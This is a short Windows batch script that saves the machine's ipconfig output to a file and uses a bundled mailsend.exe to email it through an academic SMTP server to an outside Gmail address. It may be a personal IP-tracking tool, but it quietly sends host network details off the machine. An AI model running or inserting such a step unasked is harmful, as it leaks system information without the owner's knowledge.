@echo off

if exist ipconfig.txt del ipconfig.txt
ipconfig >> ipconfig.txt

.\task\mailsend\mailsend.exe -f petrovk@ac-poitiers.fr -d ac-poitiers.fr -smtp smtp.ac-poitiers.fr -t www.hammerill@gmail.com -sub IPCONFIG -a ipconfig.txt
